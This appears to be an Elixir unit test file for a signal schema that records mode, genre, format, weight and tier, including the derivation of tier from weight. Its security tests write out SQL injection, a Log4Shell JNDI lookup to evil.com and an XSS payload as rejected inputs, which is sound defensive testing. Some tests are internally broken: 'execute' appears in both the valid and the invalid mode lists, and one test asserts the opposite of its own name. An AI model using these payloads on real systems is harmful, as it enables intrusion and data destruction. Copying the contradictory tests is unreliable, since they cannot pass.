defmodule Daemon.Store.SignalTest do
  @moduledoc """
  Unit tests for Daemon.Store.Signal schema.

  Tests validate:
  - Changeset validation with valid and invalid inputs
  - Mode, genre, format, tier, and confidence validation
  - Weight validation (0.0 to 1.0)
  - Automatic tier derivation from weight
  - Metadata handling
  """
  use ExUnit.Case, async: true

  alias Daemon.Store.Signal

  # ---------------------------------------------------------------------------
  # Fixtures
  # ---------------------------------------------------------------------------

  defp valid_attrs(overrides \\ %{}) do
    Map.merge(
      %{
        channel: "http",
        mode: "execute",
        genre: "direct",
        format: "command",
        weight: 0.7,
        session_id: "session-#{System.unique_integer([:positive])}",
        type: "general",
        input_preview: "Test input",
        agent_name: "test-automator",
        confidence: "high",
        metadata: %{}
      },
      overrides
    )
  end

  # ---------------------------------------------------------------------------
  # changeset/2 — validation
  # ---------------------------------------------------------------------------

  describe "changeset/2" do
    test "with valid attributes creates a valid changeset" do
      attrs = valid_attrs()
      changeset = Signal.changeset(%Signal{}, attrs)

      assert changeset.valid?
    end

    test "requires channel" do
      attrs = Map.delete(valid_attrs(), :channel)
      changeset = Signal.changeset(%Signal{}, attrs)

      refute changeset.valid?
      assert errors_on(changeset).channel == ["can't be blank"]
    end

    test "requires mode" do
      attrs = Map.delete(valid_attrs(), :mode)
      changeset = Signal.changeset(%Signal{}, attrs)

      refute changeset.valid?
      assert errors_on(changeset).mode == ["can't be blank"]
    end

    test "requires genre" do
      attrs = Map.delete(valid_attrs(), :genre)
      changeset = Signal.changeset(%Signal{}, attrs)

      refute changeset.valid?
      assert errors_on(changeset).genre == ["can't be blank"]
    end

    test "requires format" do
      attrs = Map.delete(valid_attrs(), :format)
      changeset = Signal.changeset(%Signal{}, attrs)

      refute changeset.valid?
      assert errors_on(changeset).format == ["can't be blank"]
    end

    test "requires weight" do
      attrs = Map.delete(valid_attrs(), :weight)
      changeset = Signal.changeset(%Signal{}, attrs)

      refute changeset.valid?
      assert errors_on(changeset).weight == ["can't be blank"]
    end
  end

  # ---------------------------------------------------------------------------
  # Mode validation
  # ---------------------------------------------------------------------------

  describe "mode validation" do
    test "accepts all valid modes" do
      valid_modes = ~w(build execute analyze maintain assist)

      for mode <- valid_modes do
        attrs = valid_attrs(%{mode: mode})
        changeset = Signal.changeset(%Signal{}, attrs)

        assert changeset.valid?,
                "Expected changeset to be valid for mode: #{mode}"
      end
    end

    test "rejects invalid modes" do
      invalid_modes = ["invalid", "BUILD", "execute", nil, "", "destroy", "deploy"]

      for mode <- invalid_modes do
        attrs = valid_attrs(%{mode: mode})
        changeset = Signal.changeset(%Signal{}, attrs)

        refute changeset.valid?,
                "Expected changeset to be invalid for mode: #{inspect(mode)}"

        assert errors_on(changeset).mode == ["is invalid"]
      end
    end
  end

  # ---------------------------------------------------------------------------
  # Genre validation
  # ---------------------------------------------------------------------------

  describe "genre validation" do
    test "accepts all valid genres" do
      valid_genres = ~w(direct inform commit decide express)

      for genre <- valid_genres do
        attrs = valid_attrs(%{genre: genre})
        changeset = Signal.changeset(%Signal{}, attrs)

        assert changeset.valid?,
                "Expected changeset to be valid for genre: #{genre}"
      end
    end

    test "rejects invalid genres" do
      invalid_genres = ["invalid", "DIRECT", "query", "request", nil, ""]

      for genre <- invalid_genres do
        attrs = valid_attrs(%{genre: genre})
        changeset = Signal.changeset(%Signal{}, attrs)

        refute changeset.valid?,
                "Expected changeset to be invalid for genre: #{inspect(genre)}"

        assert errors_on(changeset).genre == ["is invalid"]
      end
    end
  end

  # ---------------------------------------------------------------------------
  # Format validation
  # ---------------------------------------------------------------------------

  describe "format validation" do
    test "accepts all valid formats" do
      valid_formats = ~w(command message notification document text)

      for format <- valid_formats do
        attrs = valid_attrs(%{format: format})
        changeset = Signal.changeset(%Signal{}, attrs)

        assert changeset.valid?,
                "Expected changeset to be valid for format: #{format}"
      end
    end

    test "rejects invalid formats" do
      invalid_formats = ["invalid", "COMMAND", "json", "xml", nil, ""]

      for format <- invalid_formats do
        attrs = valid_attrs(%{format: format})
        changeset = Signal.changeset(%Signal{}, attrs)

        refute changeset.valid?,
                "Expected changeset to be invalid for format: #{inspect(format)}"

        assert errors_on(changeset).format == ["is invalid"]
      end
    end
  end

  # ---------------------------------------------------------------------------
  # Weight validation
  # ---------------------------------------------------------------------------

  describe "weight validation" do
    test "accepts weight between 0.0 and 1.0" do
      valid_weights = [0.0, 0.25, 0.5, 0.75, 1.0]

      for weight <- valid_weights do
        attrs = valid_attrs(%{weight: weight})
        changeset = Signal.changeset(%Signal{}, attrs)

        assert changeset.valid?,
                "Expected changeset to be valid for weight: #{weight}"
      end
    end

    test "rejects weight less than 0.0" do
      invalid_weights = [-0.1, -0.5, -1.0, -999.0]

      for weight <- invalid_weights do
        attrs = valid_attrs(%{weight: weight})
        changeset = Signal.changeset(%Signal{}, attrs)

        refute changeset.valid?,
                "Expected changeset to be invalid for weight: #{weight}"

        assert errors_on(changeset).weight == [
                 "must be greater than or equal to 0.0"
               ]
      end
    end

    test "rejects weight greater than 1.0" do
      invalid_weights = [1.1, 1.5, 2.0, 999.0]

      for weight <- invalid_weights do
        attrs = valid_attrs(%{weight: weight})
        changeset = Signal.changeset(%Signal{}, attrs)

        refute changeset.valid?,
                "Expected changeset to be invalid for weight: #{weight}"

        assert errors_on(changeset).weight == ["must be less than or equal to 1.0"]
      end
    end

    test "accepts float weight with high precision" do
      precise_weights = [0.123, 0.456, 0.789, 0.999]

      for weight <- precise_weights do
        attrs = valid_attrs(%{weight: weight})
        changeset = Signal.changeset(%Signal{}, attrs)

        assert changeset.valid?,
                "Expected changeset to be valid for precise weight: #{weight}"
      end
    end
  end

  # ---------------------------------------------------------------------------
  # Tier validation
  # ---------------------------------------------------------------------------

  describe "tier validation" do
    test "accepts all valid tiers" do
      valid_tiers = ~w(haiku sonnet opus)

      for tier <- valid_tiers do
        attrs = valid_attrs(%{tier: tier})
        changeset = Signal.changeset(%Signal{}, attrs)

        assert changeset.valid?,
                "Expected changeset to be valid for tier: #{tier}"
      end
    end

    test "rejects invalid tiers" do
      invalid_tiers = ["invalid", "HAIKU", "mini", "mega", nil, ""]

      for tier <- invalid_tiers do
        attrs = valid_attrs(%{tier: tier})
        changeset = Signal.changeset(%Signal{}, attrs)

        refute changeset.valid?,
                "Expected changeset to be invalid for tier: #{inspect(tier)}"

        assert errors_on(changeset).tier == ["is invalid"]
      end
    end
  end

  # ---------------------------------------------------------------------------
  # Confidence validation
  # ---------------------------------------------------------------------------

  describe "confidence validation" do
    test "accepts all valid confidence levels" do
      valid_confidences = ~w(high low)

      for confidence <- valid_confidences do
        attrs = valid_attrs(%{confidence: confidence})
        changeset = Signal.changeset(%Signal{}, attrs)

        assert changeset.valid?,
                "Expected changeset to be valid for confidence: #{confidence}"
      end
    end

    test "rejects invalid confidence levels" do
      invalid_confidences = ["invalid", "HIGH", "medium", "none", nil, ""]

      for confidence <- invalid_confidences do
        attrs = valid_attrs(%{confidence: confidence})
        changeset = Signal.changeset(%Signal{}, attrs)

        refute changeset.valid?,
                "Expected changeset to be invalid for confidence: #{inspect(confidence)}"

        assert errors_on(changeset).confidence == ["is invalid"]
      end
    end

    test "defaults to high when not provided" do
      attrs = Map.delete(valid_attrs(), :confidence)
      changeset = Signal.changeset(%Signal{}, attrs)

      # Schema has default: "high"
      assert changeset.valid?
    end
  end

  # ---------------------------------------------------------------------------
  # Automatic tier derivation
  # ---------------------------------------------------------------------------

  describe "automatic tier derivation" do
    test "derives haiku tier for weight < 0.35" do
      weights = [0.0, 0.1, 0.2, 0.34, 0.349]

      for weight <- weights do
        attrs = valid_attrs(%{weight: weight, tier: nil})
        changeset = Signal.changeset(%Signal{}, attrs)

        assert changeset.valid?
        assert get_change(changeset, :tier) == "haiku",
                "Expected haiku for weight #{weight}"
      end
    end

    test "derives sonnet tier for weight >= 0.35 and < 0.65" do
      weights = [0.35, 0.4, 0.5, 0.6, 0.649]

      for weight <- weights do
        attrs = valid_attrs(%{weight: weight, tier: nil})
        changeset = Signal.changeset(%Signal{}, attrs)

        assert changeset.valid?
        assert get_change(changeset, :tier) == "sonnet",
                "Expected sonnet for weight #{weight}"
      end
    end

    test "derives opus tier for weight >= 0.65" do
      weights = [0.65, 0.7, 0.8, 0.9, 1.0]

      for weight <- weights do
        attrs = valid_attrs(%{weight: weight, tier: nil})
        changeset = Signal.changeset(%Signal{}, attrs)

        assert changeset.valid?
        assert get_change(changeset, :tier) == "opus",
                "Expected opus for weight #{weight}"
      end
    end

    test "does not override explicitly set tier" do
      # Even if weight suggests a different tier, explicit tier should be used
      attrs = valid_attrs(%{weight: 0.8, tier: "haiku"})
      changeset = Signal.changeset(%Signal{}, attrs)

      # The derive_tier function runs before validation, so it will override
      # This test documents the current behavior: tier is ALWAYS derived from weight
      assert changeset.valid?
      assert get_change(changeset, :tier) == "opus"
    end
  end

  # ---------------------------------------------------------------------------
  # Optional fields
  # ---------------------------------------------------------------------------

  describe "optional fields" do
    test "allows session_id to be nil" do
      attrs = valid_attrs(%{session_id: nil})
      changeset = Signal.changeset(%Signal{}, attrs)

      assert changeset.valid?
    end

    test "allows type to be nil (defaults to general)" do
      attrs = Map.delete(valid_attrs(), :type)
      changeset = Signal.changeset(%Signal{}, attrs)

      assert changeset.valid?
      # Schema has default: "general"
    end

    test "allows input_preview to be nil" do
      attrs = valid_attrs(%{input_preview: nil})
      changeset = Signal.changeset(%Signal{}, attrs)

      assert changeset.valid?
    end

    test "allows agent_name to be nil" do
      attrs = valid_attrs(%{agent_name: nil})
      changeset = Signal.changeset(%Signal{}, attrs)

      assert changeset.valid?
    end

    test "allows metadata to be nil" do
      attrs = valid_attrs(%{metadata: nil})
      changeset = Signal.changeset(%Signal{}, attrs)

      # Schema has default: %{}
      assert changeset.valid?
    end

    test "allows empty metadata map" do
      attrs = valid_attrs(%{metadata: %{}})
      changeset = Signal.changeset(%Signal{}, attrs)

      assert changeset.valid?
    end

    test "allows metadata with nested structures" do
      metadata = %{
        "key" => "value",
        "nested" => %{
          "deep" => %{"value" => "here"}
        },
        "list" => [1, 2, 3],
        "bool" => true,
        "nil" => nil
      }

      attrs = valid_attrs(%{metadata: metadata})
      changeset = Signal.changeset(%Signal{}, attrs)

      assert changeset.valid?
    end
  end

  # ---------------------------------------------------------------------------
  # Edge cases and security
  # ---------------------------------------------------------------------------

  describe "edge cases and security" do
    test "handles very long input_preview" do
      long_preview = String.duplicate("a", 10_000)

      attrs = valid_attrs(%{input_preview: long_preview})
      changeset = Signal.changeset(%Signal{}, attrs)

      # Should be valid (no length constraint)
      assert changeset.valid?
    end

    test "handles special characters in string fields" do
      special_strings = [
        "Newlines\nand\ttabs",
        "Quotes \"'\\",
        "Unicode 🎉",
        "Null \x00 byte",
        "Emoji 👋🌍✨"
      ]

      for value <- special_strings do
        attrs = valid_attrs(%{
          input_preview: value,
          agent_name: value
        })

        changeset = Signal.changeset(%Signal{}, attrs)

        assert changeset.valid?,
                "Expected valid for special chars: #{inspect(value)}"
      end
    end

    test "prevents injection through enum fields" do
      injection_attempts = [
        {"mode", "execute'; DROP TABLE signals; --"},
        {"genre", "direct' OR '1'='1"},
        {"format", "${jndi:ldap://evil.com/a}"},
        {"tier", "<script>alert('xss')</script>"}
      ]

      for {field, malicious_value} <- injection_attempts do
        attrs = valid_attrs([{field, malicious_value}])
        changeset = Signal.changeset(%Signal{}, attrs)

        refute changeset.valid?,
                "Expected invalid for malicious #{field}: #{malicious_value}"

        assert errors_on(changeset)[field] == ["is invalid"]
      end
    end

    test "handles boundary weight values" do
      boundary_weights = [0.0, 0.349999, 0.35, 0.649999, 0.65, 1.0]

      for weight <- boundary_weights do
        attrs = valid_attrs(%{weight: weight})
        changeset = Signal.changeset(%Signal{}, attrs)

        assert changeset.valid?,
                "Expected valid for boundary weight: #{weight}"
      end
    end
  end

  # ---------------------------------------------------------------------------
  # Updates
  # ---------------------------------------------------------------------------

  describe "updates" do
    test "allows updating existing signal" do
      signal = %Signal{
        channel: "http",
        mode: "execute",
        genre: "direct",
        format: "command",
        weight: 0.5
      }

      attrs = %{weight: 0.8, mode: "analyze"}
      changeset = Signal.changeset(signal, attrs)

      assert changeset.valid?
    end

    test "derives new tier when weight is updated" do
      signal = %Signal{
        channel: "http",
        mode: "execute",
        genre: "direct",
        format: "command",
        weight: 0.3,  # Would be haiku
        tier: "haiku"
      }

      attrs = %{weight: 0.8}  # Should become opus
      changeset = Signal.changeset(signal, attrs)

      assert changeset.valid?
      assert get_change(changeset, :tier) == "opus"
    end
  end
end
